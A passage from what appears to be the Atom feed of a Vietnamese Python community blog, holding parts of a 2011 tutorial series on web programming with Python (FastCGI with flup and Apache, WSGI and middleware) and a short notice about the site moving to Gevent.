&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Thực thi ứng dụng này với lệnh &lt;strong&gt;python hello2.py&lt;/strong&gt;, chạy máy chủ Apache với các thiết lập đã làm trong bài viết kỳ trước, và truy cập vào địa chỉ &lt;strong&gt;http://localhost/fcgi-bin/hello.py&lt;/strong&gt; thì chúng ta sẽ thấy hình như sau:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/wsgi/wsgi1.png" /&gt;
&lt;p&gt;Khi làm tươi trình duyệt thì chúng ta nhận được hình sau:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/wsgi/wsgi2.png" /&gt;
&lt;p&gt;So sánh ứng dụng viết theo WSGI và ứng dụng viết theo các giao thức CGI, hay FCGI ta thấy rõ rằng ứng dụng WSGI không cần quan tâm đến việc dữ liệu sẽ được truyền cho trình duyệt bằng cách nào. Ứng dụng WSGI chỉ quan tâm đến việc tạo ra dữ liệu gì và đẩy chỗ dữ liệu đó cho lớp WSGI bên dưới. Lớp này sẽ tự động thực hiện việc truyền tới trình duyệt theo cách tốt nhất có thể.&lt;/p&gt;
&lt;p&gt;Tuy nhiên, ứng dụng WSGI cũng phải biết rõ cách hoạt động của máy chủ WSGI. Ví dụ, một ứng dụng WSGI chạy trên máy chủ WSGI theo mô hình CGI thì sẽ không thể trông chờ đến việc sử dụng lại biến toàn cục vì mỗi yêu cầu được một tiến trình riêng xử lý. Đồng thời ứng dụng WSGI cũng phải đảm bảo rằng các chuỗi trả về phải là chuỗi byte (byte string) và không được sử dụng chuỗi unicode (unicode string). Lý do là vì giao thức HTTP không hiểu unicode. Do đó, tốt nhất là ứng dụng WSGI nên gọi &lt;strong&gt;encode&lt;/strong&gt; trên các chuỗi unicode để chuyển các chuỗi unicode thành các chuỗi byte trước khi đưa xuống cho máy chủ WSGI.&lt;/p&gt;
&lt;p&gt;Một điểm hay của giao tiếp WSGI là một ứng dụng WSGI có thể gói (wrap) một ứng dụng WSGI khác bên trong. Điều này cho phép chúng ta tạo ra các ứng dụng WSGI hoạt động như các phần giữa (middleware), hoặc bộ lọc (filter). Ví dụ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;simple_app&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Simplest possible application object&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
  &lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;200 OK&amp;#39;&lt;/span&gt;
  &lt;span class="n"&gt;response_headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;text/plain&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
  &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response_headers&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Hello world!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;real_app&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;simple_app&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Tag!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Với đoạn mã trên, ứng dụng &lt;strong&gt;real_app&lt;/strong&gt; đã gói ứng dụng &lt;strong&gt;simple_app&lt;/strong&gt; và chèn vào một chuỗi &lt;strong&gt;Tag!n&lt;/strong&gt; phía trước những gì mà &lt;strong&gt;simple_app&lt;/strong&gt; gửi về. Đây là một cách để tạo nên các ứng dụng web lớn từ việc ghép các ứng dụng web nhỏ lại với nhau.&lt;/p&gt;
&lt;p&gt;Chúng ta dừng loạt bài &lt;strong&gt;Lập trình web với Python&lt;/strong&gt; tại đây. Sau 7 bài viết ngắn gọn (nhưng diễn ra trong một khoảng thời gian dài), chúng ta đã xem xét qua việc cài đặt Apache, và Python, rồi các giao thức nền tảng như HTTP, CGI. Từ đó, chúng ta bàn đến các giao thức hiện đại hơn, có một số ưu điểm tốt như FCGI với ví dụ đếm số lần truy cập. Cuối cùng chúng ta dừng lại với một thảo luận ngắn về giao tiếp WSGI, là giao tiếp phổ thông nhất để viết ứng dụng web trong thế giới Python.&lt;/p&gt;
&lt;p&gt;Tôi hy vọng sẽ gặp bạn đọc trong các bài viết khác. Để thảo luận về loạt bài này, bạn có thể sử dụng &lt;a class="reference external" href="forum.vithon.org"&gt;diễn đàn&lt;/a&gt;.&lt;/p&gt;
</content><category term="web"></category><category term="wsgi"></category><category term="tutorial"></category></entry><entry><title>Vithon nâng cấp sử dụng Gevent</title><link href="/2011/08/vithon-nang-cap-su-dung-gevent.html" rel="alternate"></link><published>2011-08-01T01:25:00+07:00</published><updated>2011-08-01T01:25:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2011-08-01:/2011/08/vithon-nang-cap-su-dung-gevent.html</id><summary type="html">&lt;p&gt;Suốt thời gian qua, nhóm PCNV đã sử dụng chế độ CGI để chạy các ứng dụng web và vẫn đảm bảo được việc truy cập của các bạn quan tâm đến ngôn ngữ Python.&lt;/p&gt;
&lt;p&gt;Tuy nhiên, để tránh các vấn đề kỹ thuật có thể phát sinh khi số …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Suốt thời gian qua, nhóm PCNV đã sử dụng chế độ CGI để chạy các ứng dụng web và vẫn đảm bảo được việc truy cập của các bạn quan tâm đến ngôn ngữ Python.&lt;/p&gt;
&lt;p&gt;Tuy nhiên, để tránh các vấn đề kỹ thuật có thể phát sinh khi số lượng thành viên tăng lên, cũng như do đòi hỏi của một số tính năng trên diễn đàn, nhóm PCNV đã chuyển hai ứng dụng web là Zine và Vithon Forum qua chạy cùng Gevent, tận dụng chế độ trao đổi không đồng bộ. Việc chuyển đổi này hy vọng sẽ khiến tốc độ truy cập được cải tiến đáng kể.&lt;/p&gt;
&lt;p&gt;Nếu các bạn gặp trục trặc trong việc truy cập vào trang PCNV và diễn đàn, thì các bạn hãy thông báo cho chúng tôi theo thông tin liên lạc ở đầu trang.&lt;/p&gt;
</content><category term="cgi"></category><category term="wsgi"></category><category term="gevent"></category><category term="vithon"></category></entry><entry><title>Lập trình web với Python (6)</title><link href="/2011/07/lap-trinh-web-voi-python-6.html" rel="alternate"></link><published>2011-07-01T10:05:00+07:00</published><updated>2011-07-01T10:05:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2011-07-01:/2011/07/lap-trinh-web-voi-python-6.html</id><summary type="html">&lt;p&gt;Phần trước chúng ta đã xem xét mô hình hoạt động của một ứng dụng FCGI. Trong phần này chúng ta sẽ viết thử một chương trình FCGI như đã đề cập.&lt;/p&gt;
&lt;p&gt;Trước tiên, chúng ta sẽ cần cài đặt thư viện &lt;strong&gt;flup&lt;/strong&gt; của tác giả Allan Saddi. Làm việc …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Phần trước chúng ta đã xem xét mô hình hoạt động của một ứng dụng FCGI. Trong phần này chúng ta sẽ viết thử một chương trình FCGI như đã đề cập.&lt;/p&gt;
&lt;p&gt;Trước tiên, chúng ta sẽ cần cài đặt thư viện &lt;strong&gt;flup&lt;/strong&gt; của tác giả Allan Saddi. Làm việc này khá đơn giản, chúng ta chỉ việc tải tập tin &lt;strong&gt;ez_setup.py&lt;/strong&gt; từ địa chỉ &lt;a class="reference external" href="http://peak.telecommunity.com/dist/ez_setup.py"&gt;http://peak.telecommunity.com/dist/ez_setup.py&lt;/a&gt; về một nơi nào đó trên máy, ví dụ như &lt;strong&gt;C:Python26Scripts&lt;/strong&gt;. Sau đó chúng ta sẽ gọi lệnh ở màn hình DOS như sau:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
C:\&amp;gt;c:\Python26\scripts\ez_setup.py flup
&lt;/pre&gt;
&lt;p&gt;Gói &lt;strong&gt;flup&lt;/strong&gt; sẽ được cài đặt trong &lt;strong&gt;C:Python26libsite-packages&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Ở bước 2, chúng ta sẽ tải về tập tin &lt;a class="reference external" href="http://www.fastcgi.com/dist/mod_fastcgi-2.4.6-AP22.dll"&gt;http://www.fastcgi.com/dist/mod_fastcgi-2.4.6-AP22.dll&lt;/a&gt;, đổi tên nó thành &lt;strong&gt;mod_fastcgi.dll&lt;/strong&gt; và đặt nó trong &lt;strong&gt;C:Program FilesApache Software FoundationApache2.2modules&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Kế tiếp bước 3, chúng ta sẽ cần cấu hình &lt;strong&gt;Apache&lt;/strong&gt; thành một &lt;strong&gt;FCGI client&lt;/strong&gt;. Chúng ta cần sửa tập tin &lt;strong&gt;httpd.conf&lt;/strong&gt; để thêm vào các dòng sau ở dưới cùng:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
LoadModule fastcgi_module modules/mod_fastcgi.dll
Alias &amp;quot;/fcgi-bin/hello.py&amp;quot; &amp;quot;C:/Program Files/Apache Software Foundation/Apache2.2/fcgi-bin/hello.py&amp;quot;
&amp;lt;Directory &amp;quot;C:/Program Files/Apache Software Foundation/Apache2.2/fcgi-bin/&amp;quot;&amp;gt;
  Order allow,deny
  Allow from all
&amp;lt;/Directory&amp;gt;
FastCgiExternalServer &amp;quot;C:/Program Files/Apache Software Foundation/Apache2.2/fcgi-bin/hello.py&amp;quot; -host localhost:8888
&lt;/pre&gt;
&lt;p&gt;Dòng &lt;strong&gt;LoadModule&lt;/strong&gt; bảo &lt;strong&gt;Apache&lt;/strong&gt; nạp mô-đun &lt;strong&gt;mod_fastcgi&lt;/strong&gt; mà chúng ta vừa làm ở bước 2. Dòng &lt;strong&gt;Alias&lt;/strong&gt; cho &lt;strong&gt;Apache&lt;/strong&gt; biết rằng mọi yêu cầu đến đường dẫn (URI) &lt;strong&gt;/fcgi-bin/hello.py&lt;/strong&gt; thật chất là đến tập tin &lt;strong&gt;C:/Program Files/Apache Software Foundation/Apache2.2/fcgi-bin/hello.py&lt;/strong&gt;. Chúng ta cần dòng này bởi vì &lt;strong&gt;hello.py&lt;/strong&gt; sẽ được tạo ở ngoài &lt;strong&gt;DocumentRoot&lt;/strong&gt;. Cũng chính vì thư mục &lt;strong&gt;fcgi-bin&lt;/strong&gt; không nằm trong &lt;strong&gt;DocumentRoot&lt;/strong&gt; nên chúng ta cũng cần lệnh &lt;strong&gt;Directory&lt;/strong&gt; để cho phép &lt;strong&gt;Apache&lt;/strong&gt; phục vụ những yêu cầu truy cập vào thư mục đó. Và cuối cùng lệnh &lt;strong&gt;FastCgiExternalServer&lt;/strong&gt; bảo &lt;strong&gt;Apache&lt;/strong&gt; rằng tập tin &lt;strong&gt;hello.py&lt;/strong&gt; thật chất là một ứng dụng FCGI đã được chạy sẵn tại địa chỉ &lt;strong&gt;localhost&lt;/strong&gt; ở cổng &lt;strong&gt;8888&lt;/strong&gt;. Chính câu lệnh này sẽ chuyển &lt;strong&gt;Apache&lt;/strong&gt; thành một &lt;strong&gt;FCGI client&lt;/strong&gt;, chuyển tiếp yêu cầu từ trình duyệt đến &lt;strong&gt;FCGI server&lt;/strong&gt; do chúng ta phát triển. Vì chúng ta đang cài đặt trên Windows nên chúng ta chỉ có một lựa chọn là sử dụng FCGI theo chế độ trao đổi qua socket, do đó chúng ta phải dùng &lt;strong&gt;FastCgiExternalServer&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Bước 4 là tạo tập tin &lt;strong&gt;hello.py&lt;/strong&gt; trong thư mục &lt;strong&gt;C:/Program Files/Apache Software Foundation/Apache2.2/fcgi-bin&lt;/strong&gt;. Nếu chưa có thư mục này, bạn đọc hãy tự tạo ra nó. Tập tin &lt;strong&gt;hello.py&lt;/strong&gt; sẽ có nội dung như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!C:\Python26\python.exe&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;flup.server&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;fcgi&lt;/span&gt;

&lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;HelloApp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fcgi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WSGIServer&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

      &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;handler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
              &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;
              &lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
              &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-Type: text/plain&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
              &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
              &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Hello World &lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="n"&gt;HelloApp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;bindAddress&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8888&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Trước hết, chúng ta nhập mô-đun &lt;strong&gt;flup.server.fcgi&lt;/strong&gt;. Kế tiếp chúng ta khai báo một biến đếm tên &lt;strong&gt;count&lt;/strong&gt; với giá trị khởi tạo là &lt;strong&gt;0&lt;/strong&gt;. Sau đó chúng ta khai báo ứng dụng của chúng ta bằng cách định nghĩa lớp &lt;strong&gt;HelloApp&lt;/strong&gt; kế thừa lớp &lt;strong&gt;WSGIServer&lt;/strong&gt; trong mô-đun &lt;strong&gt;flup.server.fcgi&lt;/strong&gt;. &lt;strong&gt;HelloApp&lt;/strong&gt; sẽ định nghĩa lại hàm &lt;strong&gt;handler&lt;/strong&gt; để xử lý các yêu cầu nhận được.&lt;/p&gt;
&lt;p&gt;Hàm &lt;strong&gt;handler&lt;/strong&gt; nhận vào một tham số đó là đối tượng &lt;strong&gt;req&lt;/strong&gt; chứa thông tin về các biến môi trường, các dòng dữ liệu chuẩn như &lt;strong&gt;stdin&lt;/strong&gt;, &lt;strong&gt;stdout&lt;/strong&gt;. Chúng ta sẽ cộng một vào biến đếm toàn cục, và xuất giá trị này ra lại cho trình duyệt. Như một ứng dụng CGI (FCGI) thông thường, trước hết chúng ta cần phải xác định kiểu dữ liệu trả về thông qua &lt;strong&gt;Content-Type&lt;/strong&gt;, theo sau bởi một dòng trống đánh dấu sự chấm dứt các đầu đề (header) và bắt đầu của nội dung, và cuối cùng là nội dung.&lt;/p&gt;
&lt;p&gt;Hai dòng lệnh cuối chỉ đơn giản là chạy ứng dụng FCGI này ở địa chỉ &lt;strong&gt;localhost&lt;/strong&gt; và cổng &lt;strong&gt;8888&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Để kiểm tra, chúng ta sẽ cần thực hiện ba việc: chạy ứng dụng &lt;strong&gt;hello.py&lt;/strong&gt;, chạy &lt;strong&gt;Apache&lt;/strong&gt;, và dùng trình duyệt xem trang &lt;strong&gt;http://localhost/fcgi-bin/hello.py&lt;/strong&gt;. Để chạy ứng dụng &lt;strong&gt;hello.py&lt;/strong&gt; chúng ta chỉ cần nhập lệnh sau ở màn hình DOS:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
c:\Program Files\Apache Software Foundation\Apache2.2\fcgi-bin&amp;gt;python hello.py
&lt;/pre&gt;
&lt;p&gt;Khi dùng trình duyệt vào xem trang web như trên thì chúng ta sẽ nhận được hình sau:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/fcgi/hello1.png" /&gt;
&lt;p&gt;Nếu làm tươi trình duyệt thì chúng ta sẽ thấy giá trị đếm tăng lên:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/fcgi/hello2.png" /&gt;
&lt;p&gt;Như vậy chứng tỏ rằng các yêu cầu đều được phục vụ bởi một tiến trình duy nhất. Đây chính là lợi điểm của FCGI so với CGI.&lt;/p&gt;
&lt;p&gt;Trong bài sau, chúng ta sẽ xem xét cách phát triển ứng dụng web với WSGI.&lt;/p&gt;
</content><category term="python"></category><category term="web"></category><category term="tutorial"></category><category term="fcgi"></category></entry><entry><title>Lập trình web với Python (5)</title><link href="/2011/03/lap-trinh-web-voi-python-5.html" rel="alternate"></link><published>2011-03-24T10:39:00+07:00</published><updated>2011-03-24T10:39:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2011-03-24:/2011/03/lap-trinh-web-voi-python-5.html</id><summary type="html">&lt;p&gt;Bẵng một thời gian, chúng ta lại quay lại với loạt bài Lập trình web với Python. Trong kỳ này, chúng ta sẽ bàn đến mô hình FastCGI (FCGI).&lt;/p&gt;
&lt;p&gt;Cái tên FCGI khiến người ta liên tưởng đến mô hình CGI như đã trình bày trong kỳ trước. Nhưng, thật …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Bẵng một thời gian, chúng ta lại quay lại với loạt bài Lập trình web với Python. Trong kỳ này, chúng ta sẽ bàn đến mô hình FastCGI (FCGI).&lt;/p&gt;
&lt;p&gt;Cái tên FCGI khiến người ta liên tưởng đến mô hình CGI như đã trình bày trong kỳ trước. Nhưng, thật tế là FCGI là một mô hình rất khác so với CGI.&lt;/p&gt;
&lt;p&gt;Các ứng dụng FCGI là các ứng dụng &lt;strong&gt;bền&lt;/strong&gt;, tức là một tiến trình FCGI có thể phục vụ nhiều yêu cầu chứ không phải chỉ một yêu cầu như ứng dụng CGI. Do đó, các ứng dụng FCGI có thể sử dụng các biến có phạm vi ứng dụng (application-scoped variable, tương đương với các biến toàn cục, global variable), tồn tại qua nhiều yêu cầu.&lt;/p&gt;
&lt;p&gt;Xét ví dụ một chương trình web hiển thị số lần truy cập vào trang.&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Với mô hình &lt;strong&gt;CGI&lt;/strong&gt;, khi có yêu cầu gửi đến, máy chủ web (web server, httpd) sẽ tạo một tiến trình khác, chạy chương trình CGI, chương trình này khởi tạo biến đếm với giá trị 0, tăng nó lên 1, và hiển thị số 1 rồi tiến trình kết thúc. Khi có yêu cầu thứ hai đến, máy chủ lại tạo một tiến trình khác, chạy chương trình CGI, chương trình này khởi tạo biến đếm với giá trị 0, tăng nó lên 1, và hiển thị số 1, và kết thúc tiến trình. Như vậy, vì mỗi yêu cầu được một tiến trình riêng phục vụ nên chúng ta sẽ cần phải lưu biến đếm vào một tài nguyên ngoài (ví dụ như tập tin, hoặc cơ sở dữ liệu), và các tiến trình truy cập vào cùng tài nguyên này.&lt;/li&gt;
&lt;li&gt;Với mô hình &lt;strong&gt;FCGI&lt;/strong&gt;, một tiến trình FCGI sẽ được chạy trước. Chương trình này được gọi là một &lt;strong&gt;FCGI server&lt;/strong&gt;. Chương trình này khởi tạo biến đếm với giá trị 0 và bước vào một vòng lập vô tận để nhận yêu cầu. Trình duyệt gửi yêu cầu đến máy chủ web. Khi này máy chủ web sẽ chuyển yêu cầu này đến ứng dụng FCGI đã được chạy trước đó. Như vậy, máy chủ web đóng vai trò là một &lt;strong&gt;FCGI client&lt;/strong&gt;. Ở phía FCGI server, yêu cầu được chấp nhận (accept), biến đếm được tăng lên thành 1, kết quả trả về lại cho httpd, và FCGI server quay lại vòng lập nhận yêu cầu. Máy chủ web trả lại kết quả cho trình duyệt. Khi có yêu cầu kế tiếp, máy chủ httpd lại chuyển yêu cầu đó cho cùng FCGI server. Yêu cầu này được chấp nhận, biến đếm được tăng thành 2 vì đang trong cùng một tiến trình, kết quả trả về lại cho httpd và tiếp tục như đã bàn.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;Vì mô hình hoạt động của FCGI khác với CGI nên việc trao đổi giữa FCGI client và FCGI server (giữa httpd và ứng dụng FCGI) không thể sử dụng cùng một giao thức đơn giản như ứng dụng CGI nữa. Việc này đòi hỏi một giao thức riêng cho FCGI.&lt;/p&gt;
&lt;p&gt;Mô hình hoạt động đơn giản của FCGI được miêu tả trong hình dưới.&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/fcgi/overview_lifecycle.png" /&gt;
&lt;p&gt;Ngoài lợi ích về tốc độ (do không phải tạo tiến trình mới để phục vụ mỗi yêu cầu, và khả năng chia sẻ tài nguyên thông qua biến có phạm vi ứng dụng), các ứng dụng FCGI còn có thể được triển khai trên hệ thống khác với hệ thống máy chủ web, giúp cho việc phân bổ tài nguyên giữa httpd và FCGI server được hiệu quả hơn. FCGI hỗ trợ hai cách giao tiếp là thông qua &lt;strong&gt;stream pipe&lt;/strong&gt;, và thông qua &lt;strong&gt;socket&lt;/strong&gt;. Cách giao tiếp stream pipe tương tự như việc gửi và nhận dữ liệu qua &lt;strong&gt;stdin&lt;/strong&gt;, và &lt;strong&gt;stdout&lt;/strong&gt;. Cách giao tiếp này được sử dụng cho các ứng dụng FCGI triển khai trên cùng hệ thống với httpd. Cách giao tiếp socket sử dụng một kết nối TCP để đóng gói và gửi dữ liệu của &lt;strong&gt;env-vars&lt;/strong&gt;, &lt;strong&gt;stdin&lt;/strong&gt;, &lt;strong&gt;stdout&lt;/strong&gt;, và &lt;strong&gt;stderr&lt;/strong&gt; tới ứng dụng FCGI. Điều này cho phép ứng dụng FCGI được triển khai trên một hệ thống khác, và httpd sẽ liên lạc với ứng dụng này dựa vào kết nối mạng TCP. Do đó, việc tối ưu tài nguyên hệ thống có thể được thực hiện dễ dàng hơn so với ứng dụng CGI. Đối với ứng dụng FCGI, FCGI server có thể được chạy trong chế độ đa tiến trình, hoặc đa tiểu trình đều được. FCGI server có thể được chạy trên một máy 8 lõi, trong khi httpd chạy trên một máy khác đơn nhân. FCGI server phục vụ các dữ liệu động, trong khi httpd phục vụ các dữ liệu tĩnh như hình ảnh, trang web tĩnh.&lt;/p&gt;
&lt;p&gt;Chúng ta vừa xem qua mô hình hoạt động của FCGI. Đi sâu hơn vào cấu trúc từng ứng dụng FCGI thì dúng ta có ba phần chính sau:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Mã khởi tạo&lt;/li&gt;
&lt;li&gt;Vòng lặp nhận yêu cầu&lt;/li&gt;
&lt;li&gt;Xử lý yêu cầu và trả kết quả&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;Trong ví dụ về ứng dụng hiển thị số lượt truy cập, mã khởi tạo là việc khởi tạo biến đếm toàn cụ với giá trị 0.&lt;/p&gt;
&lt;p&gt;Vòng lặp nhận yêu cầu thường là một vòng lặp vô hạn, tương tự như:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="n"&gt;fcgi_accept&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
  &lt;span class="c1"&gt;# xử lý yêu cầu như CGI&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Trong khi yêu cầu được chấp nhận, thì dữ liệu nhập cũng được tách ra thành &lt;strong&gt;env-vars&lt;/strong&gt;, &lt;strong&gt;stdin&lt;/strong&gt;, &lt;strong&gt;stdout&lt;/strong&gt;, và &lt;strong&gt;stderr&lt;/strong&gt;. Điều này khiến cho việc xử lý yêu cầu của một ứng dụng FCGI không khác bao nhiêu so với việc xử lý của một ứng dụng CGI. Tất cả đều được thực hiện trên các biến môi trường, và các luồng chuẩn. Điều khác biệt đó là sau khi xử lý xong yêu cầu thì ứng dụng FCGI lại quay lại vòng lặp nhận yêu cầu mà không chấm dứt tiến trình như một ứng dụng CGI.&lt;/p&gt;
&lt;p&gt;Vì không phải chấm dứt tiến trình sau mỗi yêu cầu nên các tiến trình FCGI có thể được &amp;quot;sử dụng lại&amp;quot;. Một ứng dụng FCGI có thể được khởi tạo trước, với 10 tiến trình chẳng hạn, và đặt trong một bể (pool) tiến trình sẵn sàng. Khi có yêu cầu đến, thì máy chủ web có thể ngay lập tức lấy ra một tiến trình từ bể này, và gửi thông tin đến nó. Khi kết thúc xử lý yêu cầu, máy chủ web lại đưa tiến trình này vào bể. Việc khởi tạo trước tiết kiệm được thời gian khởi tạo ban đầu, nhưng sẽ chiếm bộ nhớ, ngay cả khi chưa có yêu cầu nào được nhận.&lt;/p&gt;
&lt;p&gt;Sau đây là mô hình chi tiết của một ứng dụng FCGI.&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/fcgi/detailed_lifecycle.png" /&gt;
